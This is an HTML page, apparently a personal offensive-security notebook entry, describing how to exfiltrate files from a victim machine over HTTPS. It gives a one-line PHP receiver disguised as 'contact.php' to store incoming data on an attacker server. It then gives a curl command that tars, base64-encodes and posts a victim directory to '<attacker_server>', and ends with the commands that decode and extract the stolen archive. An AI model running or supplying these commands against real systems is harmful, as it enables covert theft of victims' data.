<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exfiltration over HTTPS via POST Reques</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Exfiltration over HTTPS via POST Reques</h1><br /><strong>
      <h3>Prerequisites</h3>
    </strong><br />• own a webserver that is PHP-enabled and SSL certificate installed<br /><br />“POST” base64-encoded
    data over HTTPS to a PHP-based web server that is under our control.<br /><br />1. On our <span
      style="color:#ff0000;">attacker system</span>, we create a PHP file that will write data being received as a POST
    request, to a file called /tmp/datafolder.base64 on our system. We’ll call this file “contact.php” for additional
    obscurity. The contents of the PHP file should be the following, all on a single line:<br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>?php&nbsp;file_put_contents(&#39;/tmp/datafolder.base64&#39;,&nbsp;file_get_contents(&#39;php://input&#39;));&nbsp;?<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /><br />2. From the <span style="color:#1e90ff;">victim machine</span>, we issue a curl command that will
    send a POST request consisting of the tar’d and base64-encoded data from the victims’ /tmp/datafolder directory. We
    send that POST request to our attacker controlled PHP web servers’ contact.php file over SSL which will write a copy
    of the base64-encoded tar archive to a /tmp/datafolder.base64 file on our attacker system:<br />
    <div class="codebox">
      <div class="codebox">
        curl&nbsp;--data&nbsp;&quot;$(tar&nbsp;zcf&nbsp;-&nbsp;/tmp/datafolder&nbsp;|&nbsp;base64)&quot;&nbsp;https://&lt;attacker_server&gt;/contact.php
      </div>
    </div><br /><br />3. Our <span style="color:#ff0000;">attacker machine</span> has received the POST’d data, and
    written it to the /tmp/datafolder.base64 file. We decode it while redirecting the output to a datafolder.tar
    archive, and extract:<br />
    <div class="codebox">
      <div class="codebox">
        cat&nbsp;/tmp/datafolder.base64&nbsp;|&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;datafolder.tar&nbsp;&amp;&amp;&nbsp;tar&nbsp;xf&nbsp;datafolder.tar
      </div>
    </div>
  </div>
</body>

</html>